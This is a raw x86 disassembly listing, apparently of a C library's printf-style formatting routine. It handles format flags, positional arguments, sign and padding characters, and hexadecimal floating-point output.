mov ecx, dword [arg_8h]
cmp dword [ecx], 0x6c
jne 0x8074c13
add ecx, 4
mov dword [arg_8h], ecx
or byte [ebx + 0xc], 1
jmp 0x8074d84
and byte [ebx + 0xc], 0xfa
jmp 0x8074d84
mov ecx, dword [arg_8h]
sub ecx, 4
mov dword [arg_8h], ecx
jmp 0x8074c13
mov eax, dword [edx + 4]
add ecx, 4
mov dword [arg_8h], ecx
cmp eax, 0x2a
je 0x8074df2
sub eax, 0x30
cmp eax, 9
jbe 0x8074ddd
mov dword [ebx], 0
jmp 0x8074be0
lea edx, [arg_8h]
mov dword [esp], edx
call fcn.08074ac0
mov dword [ebx], eax
mov ecx, dword [arg_8h]
jmp 0x8074be0
mov eax, dword [edx + 8]
lea ecx, [edx + 8]
mov dword [arg_8h], ecx
mov esi, ecx
sub eax, 0x30
cmp eax, 9
jbe 0x8074e1f
mov eax, dword [ebx + 0x1c]
test eax, eax
jns 0x8074dea
inc dword [var_10h]
mov eax, edi
mov ecx, esi
inc edi
mov dword [ebx + 0x1c], eax
mov dword [arg_8h], esi
jmp 0x8074be0
lea eax, [arg_8h]
mov dword [esp], eax
call fcn.08074ac0
test eax, eax
mov edx, eax
je 0x8074e05
mov ecx, dword [arg_8h]
cmp dword [ecx], 0x24
jne 0x8074e05
lea eax, [eax - 1]
mov dword [ebx + 0x1c], eax
mov eax, dword [arg_14h]
mov eax, dword [eax]
cmp edx, eax
cmovb edx, eax
add ecx, 4
mov eax, dword [arg_14h]
mov dword [arg_8h], ecx
mov dword [eax], edx
jmp 0x8074e05
lea edx, [arg_8h]
mov dword [esp], edx
call fcn.08074ac0
mov dword [ebx + 4], eax
mov ecx, dword [arg_8h]
jmp 0x8074bc8
mov eax, dword [edx + 4]
add ecx, 4
mov dword [arg_8h], ecx
mov esi, ecx
sub eax, 0x30
cmp eax, 9
jbe 0x8074e9c
mov eax, dword [ebx + 0x20]
test eax, eax
jns 0x8074e63
mov eax, edi
mov ecx, esi
mov dword [var_10h], 1
inc edi
mov dword [ebx + 0x20], eax
mov dword [arg_8h], esi
jmp 0x8074bc8
lea eax, [arg_8h]
mov dword [esp], eax
call fcn.08074ac0
test eax, eax
mov edx, eax
je 0x8074e7e
mov ecx, dword [arg_8h]
cmp dword [ecx], 0x24
jne 0x8074e7e
lea eax, [eax - 1]
mov dword [ebx + 0x20], eax
mov eax, dword [arg_14h]
mov eax, dword [eax]
cmp edx, eax
cmovb edx, eax
add ecx, 4
mov eax, dword [arg_14h]
mov dword [arg_8h], ecx
mov dword [eax], edx
jmp 0x8074e7e
or byte [ebx + 0xc], 8
jmp 0x8074b85
or byte [ebx + 0xc], 0x80
jmp 0x8074b85
or byte [ebx + 0xc], 0x40
jmp 0x8074b85
or byte [ebx + 0xc], 0x20
jmp 0x8074b85
mov dword [ebx + 0x10], 0x30
jmp 0x8074b85
or byte [ebx + 0xd], 8
jmp 0x8074b85
lea eax, [arg_8h]
mov dword [esp], eax
call fcn.08074ac0
test eax, eax
mov edx, eax
je 0x8074f24
mov eax, dword [arg_8h]
cmp dword [eax], 0x24
je 0x8074f2e
mov ecx, esi
mov dword [arg_8h], esi
jmp 0x8074b70
mov esi, dword [arg_14h]
lea ecx, [eax + 4]
lea eax, [edx - 1]
mov dword [ebx + 0x24], eax
mov dword [arg_8h], ecx
mov eax, dword [esi]
cmp edx, eax
cmovae eax, edx
mov dword [esi], eax
jmp 0x8074b70
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x16c
mov dword [var_138h], 0
mov edx, dword [arg_ch]
mov eax, dword [arg_ch]
mov ebx, dword [arg_10h]
mov dword [var_108h], 0
mov dword [var_10ch], 0
mov edx, dword [edx + 4]
mov eax, dword [eax]
mov dword [var_134h], edx
mov dword [var_130h], eax
mov eax, dword [arg_ch]
movzx ecx, byte [eax + 0xd]
mov eax, ecx
shr al, 2
mov edx, eax
and edx, 1
and ecx, 1
mov dword [var_13ch], edx
jne 0x806b7b4
mov ecx, 0
test ecx, ecx
je 0x806b7aa
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
mov eax, dword [eax + 0x24]
mov dword [var_104h_2], eax
mov eax, 0
test eax, eax
je 0x806b7a0
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
mov eax, dword [eax + 0x30]
mov dword [var_100h], eax
mov eax, dword [var_104h]
cmp byte [eax], 0
je 0x806b807
mov esi, dword [var_100h_2]
test esi, esi
je 0x806b807
mov edx, dword [var_8h]
movzx edx, byte [edx + 0xc]
mov byte [var_161h], dl
and edx, 1
je 0x806b6a4
mov eax, dword [ebx]
mov ebx, dword [eax]
mov esi, dword [eax + 4]
mov edi, dword [eax + 8]
mov dword [var_1ch], ebx
mov dword [var_18h], esi
mov dword [esp], ebx
mov dword [var_14h], edi
mov dword [var_4h], esi
mov dword [var_8h], edi
call fcn.080849f0
test eax, eax
je 0x806b5b2
mov eax, 0
mov ebx, 0x80aad18
test eax, eax
je 0x806a268
mov dword [esp], 4
call section.
mov ebx, eax
mov edx, dword [ebx]
test edx, edx
je 0x806b576
mov ecx, dword [var_8h]
mov eax, dword [ecx + 8]
test byte [edx + eax*2 + 1], 1
je 0x806b55d
mov dword [var_108h_2], 0x80a0fb4
mov dword [var_10ch_2], 0x80a0fc4
mov dword [var_118h], 0
mov ebx, dword [var_108h_2]
test ebx, ebx
je 0x806a5f8
mov ecx, dword [var_118h]
mov edx, dword [var_8h]
test ecx, ecx
mov ebx, dword [edx + 4]
jne 0x806a2c5
test byte [edx + 0xc], 0x50
je 0x806a2c6
dec ebx
sub ebx, 3
test byte [var_161h], 0x20
jne 0x806a315
test ebx, ebx
jle 0x806a315
mov eax, dword [var_13ch_2]
test eax, eax
je 0x806a5dc
mov ecx, dword [var_4h]
mov dword [var_8h], ebx
mov dword [var_4h], 0x20
mov dword [esp], ecx
call fcn.08075900
cmp eax, ebx
je 0x806a30f
mov eax, 0xffffffff
add esp, 0x16c
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_138h_2], ebx
mov eax, dword [var_118h]
test eax, eax
je 0x806a523
mov eax, dword [var_13ch_2]
test eax, eax
je 0x806a4f8
mov ecx, dword [var_4h]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806a4dc
mov dword [eax], 0x2d
add eax, 4
mov dword [edx + 0x10], eax
inc dword [var_138h_2]
mov eax, dword [var_13ch_2]
mov esi, 2
test eax, eax
je 0x806a452
mov edx, dword [var_10ch_2]
mov edi, dword [var_13ch_2]
mov ecx, dword [edx]
add edx, 4
test edi, edi
mov dword [var_10ch_2], edx
je 0x806a429
mov eax, dword [var_4h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806a414
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806a2ff
mov eax, esi
inc dword [var_138h_2]
dec esi
test eax, eax
jne 0x806a368
mov eax, dword [var_8h]
test byte [eax + 0xc], 0x20
je 0x806a3f0
test ebx, ebx
jle 0x806a3f0
mov eax, dword [var_13ch_2]
test eax, eax
je 0x806a3fb
mov edx, dword [var_4h]
mov dword [var_8h], ebx
mov dword [var_4h], 0x20
mov dword [esp], edx
call fcn.08075900
cmp eax, ebx
jne 0x806a2ff
add dword [var_138h_2], ebx
lea esi, [esi]
mov eax, dword [var_138h_2]
jmp 0x806a304
mov ecx, dword [var_4h]
mov dword [var_8h], ebx
mov dword [var_4h], 0x20
mov dword [esp], ecx
call fcn.08075680
jmp 0x806a3df
mov edx, dword [var_4h]
mov dword [var_4h], ecx
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806a39e
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806a441
mov byte [eax], cl
movzx eax, cl
mov ecx, dword [var_4h]
inc dword [ecx + 0x14]
jmp 0x806a423
movzx eax, cl
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x806a423
mov eax, dword [var_108h_2]
mov edx, dword [var_13ch_2]
movsx ecx, byte [eax]
inc eax
test edx, edx
mov dword [var_108h_2], eax
je 0x806a4b3
mov eax, dword [var_4h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806a49b
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806a2ff
mov eax, esi
inc dword [var_138h_2]
dec esi
test eax, eax
jne 0x806a452
jmp 0x806a3b1
mov edx, dword [var_4h]
mov dword [var_4h], ecx
mov dword [esp], edx
call fcn.08075d10
lea esi, [esi]
inc eax
jmp 0x806a483
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806a4cb
mov byte [eax], cl
movzx eax, cl
mov ecx, dword [var_4h]
inc dword [ecx + 0x14]
jmp 0x806a4b0
movzx eax, cl
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x806a4b0
mov dword [var_4h], 0x2d
mov dword [esp], ecx
call fcn.08075d10
inc eax
jne 0x806a34f
jmp 0x806a2ff
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806a511
mov byte [eax], 0x2d
mov ecx, dword [var_4h]
inc dword [ecx + 0x14]
jmp 0x806a34f
mov dword [var_4h], 0x2d
mov dword [esp], edx
call fcn.0804d840
jmp 0x806a4ec
mov edx, dword [var_8h]
movzx eax, byte [edx + 0xc]
test al, 0x40
je 0x806a575
mov eax, dword [var_13ch_2]
test eax, eax
je 0x806a55b
mov ecx, dword [var_4h]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806a551
mov dword [eax], 0x2b
jmp 0x806a349
mov dword [var_4h], 0x2b
jmp 0x806a4e4
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806a56b
mov byte [eax], 0x2b
jmp 0x806a506
mov dword [var_4h], 0x2b
jmp 0x806a519
test al, 0x10
je 0x806a355
mov eax, dword [var_13ch_2]
test eax, eax
je 0x806a5b3
mov eax, dword [var_4h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806a5a0
mov dword [eax], 0x20
jmp 0x806a349
mov edx, dword [var_4h]
mov dword [var_4h], 0x20
mov dword [esp], edx
jmp 0x806a4e7
mov ecx, dword [var_4h]
mov eax, dword [ecx + 0x14]
cmp eax, dword [ecx + 0x18]
jae 0x806a5cc
mov byte [eax], 0x20
mov eax, dword [var_4h]
inc dword [eax + 0x14]
jmp 0x806a34f
mov dword [var_4h], 0x20
mov dword [esp], ecx
jmp 0x806a51c
mov eax, dword [var_4h]
mov dword [var_8h], ebx
mov dword [var_4h], 0x20
mov dword [esp], eax
call fcn.08075680
jmp 0x806a2fb
test byte [var_161h], 1
jne 0x806b450
mov eax, dword [var_18h]
xor ebx, ebx
xor edx, edx
mov dword [var_148h], edx
and eax, 0xfffff
mov esi, eax
mov eax, dword [var_1ch]
or esi, edx
or ebx, eax
mov dword [var_14ch], eax
mov edx, ebx
or edx, esi
sete al
movzx eax, al
mov dword [var_128h], eax
mov ecx, dword [var_8h]
xor eax, eax
cmp dword [ecx + 8], 0x41
mov dword [var_4h], esi
mov dword [esp], ebx
sete al
mov dword [var_ch], 0x10
mov dword [var_10h], eax
lea eax, [var_3ch]
mov dword [var_8h], eax
call fcn.0808d930
lea ecx, [var_1ch]
mov edx, dword [var_8h]
mov dword [var_114h], eax
xor eax, eax
cmp dword [edx + 8], 0x41
mov dword [var_4h], esi
mov dword [esp], ebx
sete al
mov dword [var_ch], 0x10
mov dword [var_8h], ecx
mov dword [var_10h], eax
call fcn.08063ca0
mov edi, eax
lea eax, [var_70h]
cmp dword [var_114h], eax
jbe 0x806a6bb
nop
sub dword [var_114h], 4
dec edi
mov edx, dword [var_114h]
cmp edx, eax
mov dword [edx], 0x30
mov byte [edi], 0x30
ja 0x806a6a0
movzx eax, word [var_16h]
shr ax, 4
and eax, 0x7ff
setne cl
mov esi, eax
add ecx, 0x30
test eax, eax
mov byte [var_129h], cl
jne 0x806b41c
mov eax, dword [var_128h]
mov dword [var_124h], 0
test eax, eax
jne 0x806a701
mov esi, 0x3fe
mov dword [var_124h], 1
mov eax, dword [var_128h]
test eax, eax
jne 0x806b401
cmp dword [var_40h], 0x30
lea ecx, [var_1ch]
lea eax, [var_3ch]
mov dword [var_110h], ecx
je 0x806b3ed
cmp dword [var_130h_2], 0xffffffff
je 0x806b3da
mov edx, dword [var_110h]
sub edx, edi
cmp dword [var_130h_2], edx
jge 0x806a758
mov ecx, dword [var_130h_2]
cmp byte [ecx + edi], 0x38
jg 0x806b22e
je 0x806b1db
lea eax, [var_c7h]
mov dword [var_ch], 0
mov dword [var_8h], 0xa
mov dword [var_4h], eax
mov dword [esp], esi
mov ebx, 0xcccccccd
call fcn.08063c00
lea ecx, [var_d8h]
mov dword [var_11ch], eax
nop
lea esi, [esi]
mov eax, esi
sub ecx, 4
mul ebx
shr edx, 3
lea eax, [edx + edx*4]
add eax, eax
sub esi, eax
test edx, edx
mov eax, dword [esi*4 + str.0123456789abcdefghijklmnopqrstuvwxyz]
mov esi, edx
mov dword [ecx], eax
jne 0x806a790
mov ebx, dword [var_118h]
xor eax, eax
mov dword [var_120h], ecx
test ebx, ebx
jne 0x806a7cb
mov ecx, dword [var_8h]
test byte [ecx + 0xc], 0x50
je 0x806a7d0
mov eax, 1
add eax, dword [var_130h_2]
lea ecx, [var_cch]
mov edx, dword [var_134h_2]
sub ecx, dword [var_11ch]
add eax, ecx
sub edx, eax
lea ecx, [edx - 0xa]
mov eax, edx
mov dword [var_134h_2], ecx
mov ecx, dword [var_130h_2]
test ecx, ecx
jle 0x806b1c0
mov ecx, dword [var_8h]
movzx ecx, byte [ecx + 0xc]
mov byte [var_161h], cl
mov edx, dword [var_13ch_2]
test edx, edx
jne 0x806b1b2
mov eax, dword [var_104h_2]
mov dword [esp], eax
call fcn.08053400
sub dword [var_134h_2], eax
test byte [var_161h], 0x20
jne 0x806a893
mov edx, dword [var_8h]
cmp dword [edx + 0x10], 0x30
je 0x806a893
mov eax, dword [var_134h_2]
test eax, eax
jle 0x806a893
mov eax, dword [var_13ch_2]
test eax, eax
je 0x806b190
mov ecx, dword [var_134h_2]
mov eax, dword [var_4h]
mov dword [var_4h], 0x20
mov dword [var_8h], ecx
mov dword [esp], eax
call fcn.08075900
cmp eax, dword [var_134h_2]
jne 0x806a2ff
mov eax, dword [var_134h_2]
mov dword [var_138h_2], eax
mov eax, dword [var_118h]
test eax, eax
je 0x806b0d7
mov eax, dword [var_13ch_2]
test eax, eax
je 0x806b0ac
mov ecx, dword [var_4h]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806b090
mov dword [eax], 0x2d
add eax, 4
mov dword [edx + 0x10], eax
inc dword [var_138h_2]
mov esi, dword [var_13ch_2]
test esi, esi
je 0x806b065
mov ecx, dword [var_4h]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806b049
mov dword [eax], 0x30
add eax, 4
mov dword [edx + 0x10], eax
mov eax, dword [var_8h]
mov ebx, dword [var_13ch_2]
inc dword [var_138h_2]
mov ecx, dword [eax + 8]
add ecx, 0x17
test ebx, ebx
je 0x806b020
mov eax, dword [var_4h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806b00b
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806a2ff
mov eax, dword [var_8h]
inc dword [var_138h_2]
test byte [eax + 0xc], 0x20
jne 0x806a956
cmp dword [eax + 0x10], 0x30
je 0x806af9a
mov eax, dword [var_13ch_2]
movsx edx, byte [var_129h]
test eax, eax
je 0x806af71
mov eax, dword [var_4h]
mov ecx, dword [eax + 0x58]
mov eax, dword [ecx + 0x10]
cmp eax, dword [ecx + 0x14]
jae 0x806af5c
mov dword [eax], edx
add eax, 4
inc edx
mov dword [ecx + 0x10], eax
je 0x806a2ff
mov eax, dword [var_130h_2]
inc dword [var_138h_2]
test eax, eax
jle 0x806af4a
mov eax, dword [var_13ch_2]
lea esi, [var_100h_2]
mov ebx, 1
test eax, eax
jne 0x806a9c5
mov eax, dword [var_104h_2]
mov dword [esp], eax
call fcn.08053400
mov ebx, eax
mov eax, dword [var_13ch_2]
test eax, eax
je 0x806aebb
mov eax, ebx
dec ebx
test eax, eax
je 0x806aa1b
mov eax, dword [var_13ch_2]
mov ecx, dword [esi]
add esi, 4
test eax, eax
je 0x806ae92
mov eax, dword [var_4h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806ae7d
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806a2ff
mov eax, ebx
inc dword [var_138h_2]
dec ebx
test eax, eax
jne 0x806a9da
mov ecx, dword [var_130h_2]
test ecx, ecx
jle 0x806aadd
mov eax, dword [var_110h]
mov ebx, dword [var_130h_2]
mov esi, dword [var_130h_2]
mov edx, dword [var_13ch_2]
sub eax, edi
sub esi, eax
cmp ebx, eax
cmovg ebx, eax
test edx, edx
je 0x806adfa
mov eax, ebx
dec ebx
test eax, eax
je 0x806aaa6
mov eax, dword [var_114h]
mov ecx, dword [eax]
add eax, 4
mov dword [var_114h], eax
mov eax, dword [var_13ch_2]
test eax, eax
je 0x806add1
mov eax, dword [var_4h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806adbc
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806a2ff
mov eax, ebx
inc dword [var_138h_2]
dec ebx
test eax, eax
jne 0x806aa59
test esi, esi
jle 0x806aadd
mov eax, dword [var_13ch_2]
test eax, eax
je 0x806ada0
mov eax, dword [var_4h]
mov dword [var_8h], esi
mov dword [var_4h], 0x30
mov dword [esp], eax
call fcn.08075900
cmp eax, esi
jne 0x806a2ff
add dword [var_138h_2], esi
mov eax, dword [var_8h]
mov ecx, dword [eax + 8]
mov eax, dword [var_13ch_2]
add ecx, 0xf
test eax, eax
je 0x806ad77
mov eax, dword [var_4h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806ad62
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806a2ff
xor edx, edx
inc dword [var_138h_2]
mov eax, dword [var_13ch_2]
cmp dword [var_124h], 0
setne dl
test eax, eax
lea edx, [edx + edx + 0x2b]
je 0x806ad39
mov eax, dword [var_4h]
mov ecx, dword [eax + 0x58]
mov eax, dword [ecx + 0x10]
cmp eax, dword [ecx + 0x14]
jae 0x806ad24
mov dword [eax], edx
add eax, 4
mov dword [ecx + 0x10], eax
inc edx
je 0x806a2ff
lea edx, [var_cch]
mov eax, dword [var_13ch_2]
inc dword [var_138h_2]
sub edx, dword [var_11ch]
test eax, eax
lea ebx, [edx + 5]
je 0x806ac93
mov eax, ebx
lea ebx, [edx + 4]
test eax, eax
je 0x806abd3
mov edx, dword [var_120h]
mov edi, dword [var_13ch_2]
mov ecx, dword [edx]
add edx, 4
test edi, edi
mov dword [var_120h], edx
je 0x806ac6a
mov eax, dword [var_4h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806ac55
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806a2ff
mov eax, ebx
inc dword [ebp - 0x138]
dec ebx
test eax, eax
jne 0x806ab86
mov eax, dword [var_8h]
test byte [eax + 0xc], 0x20
je 0x806a3f0
mov eax, dword [eax + 0x10]
cmp eax, 0x30
je 0x806a3f0
mov ecx, dword [ebp - 0x134]
test ecx, ecx
jle 0x806a3f0
mov edx, dword [ebp - 0x13c]
test edx, edx
je 0x806ac3a
mov ecx, dword [ebp - 0x134]
mov dword [esp + 4], eax
mov eax, dword [ebp + 8]
mov dword [esp + 8], ecx
mov dword [esp], eax
call fcn.08075900
cmp eax, dword [ebp - 0x134]
jne 0x806a2ff
mov eax, dword [ebp - 0x134]
add dword [ebp - 0x138], eax
jmp 0x806a3f0
mov edx, dword [ebp - 0x134]
mov ecx, dword [ebp + 8]
mov dword [esp + 4], eax
mov dword [esp + 8], edx
mov dword [esp], ecx
call fcn.08075680
jmp 0x806ac1d
mov edx, dword [ebp + 8]
mov dword [esp + 4], ecx
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806abc0
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806ac82
mov byte [eax], cl
movzx eax, cl
mov ecx, dword [ebp + 8]
inc dword [ecx + 0x14]
jmp 0x806ac64
movzx eax, cl
mov dword [esp], edx
mov dword [esp + 4], eax
call fcn.0804d840
jmp 0x806ac64
mov eax, ebx
lea ebx, [edx + 4]
test eax, eax
je 0x806abd3
mov eax, dword [var_11ch]
mov esi, dword [var_13ch_2]
movsx ecx, byte [eax]
inc eax
test esi, esi
mov dword [var_11ch], eax
je 0x806acfb
mov eax, dword [var_4h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806ace9
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806a2ff
mov eax, ebx
inc dword [ebp - 0x138]
dec ebx
test eax, eax
jne 0x806aca0
jmp 0x806abd3
mov edx, dword [ebp + 8]
mov dword [esp + 4], ecx
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806acd1
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806ad13
mov byte [eax], cl
movzx eax, cl
mov ecx, dword [ebp + 8]
inc dword [ecx + 0x14]
jmp 0x806acf8
movzx eax, cl
mov dword [esp], edx
mov dword [esp + 4], eax
call fcn.0804d840
jmp 0x806acf8
mov dword [var_4h], edx
mov edx, dword [var_4h]
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806ab54
mov ecx, dword [var_4h]
mov eax, dword [ecx + 0x14]
cmp eax, dword [ecx + 0x18]
jae 0x806ad51
mov byte [eax], dl
mov eax, dword [var_4h]
inc dword [eax + 0x14]
jmp 0x806ab53
movzx eax, dl
mov dword [esp], ecx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x806ad33
mov edx, dword [var_4h]
mov dword [var_4h], ecx
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806ab0f
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806ad8f
mov byte [eax], cl
movzx eax, cl
mov ecx, dword [var_4h]
inc dword [ecx + 0x14]
jmp 0x806ad71
movzx eax, cl
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x806ad71
mov edx, dword [var_4h]
mov dword [var_8h], esi
mov dword [var_4h], 0x30
mov dword [esp], edx
call fcn.08075680
jmp 0x806aacf
mov edx, dword [var_4h]
mov dword [var_4h], ecx
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806aa93
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806ade9
mov byte [eax], cl
movzx eax, cl
mov ecx, dword [var_4h]
inc dword [ecx + 0x14]
jmp 0x806adcb
movzx eax, cl
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x806adcb
mov eax, ebx
dec ebx
test eax, eax
je 0x806aaa6
mov eax, dword [var_13ch_2]
movsx ecx, byte [edi]
inc edi
test eax, eax
je 0x806ae54
mov eax, dword [var_4h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806ae42
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806a2ff
mov eax, ebx
inc dword [var_138h_2]
dec ebx
test eax, eax
jne 0x806ae05
jmp 0x806aaa6
mov edx, dword [var_4h]
mov dword [var_4h], ecx
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806ae2a
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806ae6c
mov byte [eax], cl
movzx eax, cl
mov ecx, dword [var_4h]
inc dword [ecx + 0x14]
jmp 0x806ae51
movzx eax, cl
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x806ae51
mov edx, dword [var_4h]
mov dword [var_4h], ecx
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806aa08
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806aeaa
mov byte [eax], cl
movzx eax, cl
mov ecx, dword [var_4h]
inc dword [ecx + 0x14]
jmp 0x806ae8c
movzx eax, cl
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x806ae8c
mov eax, ebx
dec ebx
test eax, eax
je 0x806aa1b
mov eax, dword [var_104h_2]
mov esi, dword [var_13ch_2]
movsx ecx, byte [eax]
inc eax
test esi, esi
mov dword [var_104h_2], eax
je 0x806af21
mov eax, dword [var_4h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806af0f
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806a2ff
mov eax, ebx
inc dword [var_138h_2]
dec ebx
test eax, eax
jne 0x806aec6
jmp 0x806aa1b
mov edx, dword [var_4h]
mov dword [var_4h], ecx
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806aef7
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806af39
mov byte [eax], cl
movzx eax, cl
mov ecx, dword [var_4h]
inc dword [ecx + 0x14]
jmp 0x806af1e
movzx eax, cl
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x806af1e
mov ecx, dword [var_8h]
test byte [ecx + 0xc], 8
je 0x806aa1b
jmp 0x806a9a0
mov dword [var_4h], edx
mov edx, dword [var_4h]
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806a986
mov ecx, dword [var_4h]
mov eax, dword [ecx + 0x14]
cmp eax, dword [ecx + 0x18]
jae 0x806af89
mov byte [eax], dl
movzx eax, dl
mov edx, dword [var_4h]
inc dword [edx + 0x14]
jmp 0x806af6b
movzx eax, dl
mov dword [esp], ecx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x806af6b
mov edx, dword [var_134h_2]
test edx, edx
jle 0x806a956
mov eax, dword [var_13ch_2]
test eax, eax
je 0x806afec
mov edx, dword [var_134h_2]
mov ecx, dword [var_4h]
mov dword [var_4h], 0x30
mov dword [var_8h], edx
mov dword [esp], ecx
call fcn.08075900
cmp eax, dword [var_134h_2]
jne 0x806a2ff
mov ecx, dword [var_134h_2]
add dword [var_138h_2], ecx
jmp 0x806a956
mov eax, dword [var_134h_2]
mov edx, dword [var_4h]
mov dword [var_4h], 0x30
mov dword [var_8h], eax
mov dword [esp], edx
call fcn.08075680
jmp 0x806afcf
mov edx, dword [var_4h]
mov dword [var_4h], ecx
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806a937
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806b038
mov byte [eax], cl
movzx eax, cl
mov ecx, dword [var_4h]
inc dword [ecx + 0x14]
jmp 0x806b01a
movzx eax, cl
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x806b01a
mov dword [var_4h], 0x30
mov dword [esp], ecx
call fcn.08075d10
inc eax
jne 0x806a8ff
jmp 0x806a2ff
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806b07e
mov byte [eax], 0x30
mov ecx, dword [var_4h]
inc dword [ecx + 0x14]
jmp 0x806a8ff
mov dword [var_4h], 0x30
mov dword [esp], edx
call fcn.0804d840
jmp 0x806b059
mov dword [var_4h], 0x2d
mov dword [esp], ecx
call fcn.08075d10
inc eax
jne 0x806a8cd
jmp 0x806a2ff
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806b0c5
mov byte [eax], 0x2d
mov ecx, dword [var_4h]
inc dword [ecx + 0x14]
jmp 0x806a8cd
mov dword [var_4h], 0x2d
mov dword [esp], edx
call fcn.0804d840
jmp 0x806b0a0
mov edx, dword [var_8h]
movzx eax, byte [edx + 0xc]
test al, 0x40
je 0x806b129
mov eax, dword [var_13ch_2]
test eax, eax
je 0x806b10f
mov ecx, dword [var_4h]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806b105
mov dword [eax], 0x2b
jmp 0x806a8c7
mov dword [var_4h], 0x2b
jmp 0x806b098
mov edx, dword [var_4h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806b11f
mov byte [eax], 0x2b
jmp 0x806b0ba
mov dword [var_4h], 0x2b
jmp 0x806b0cd
test al, 0x10
je 0x806a8d3
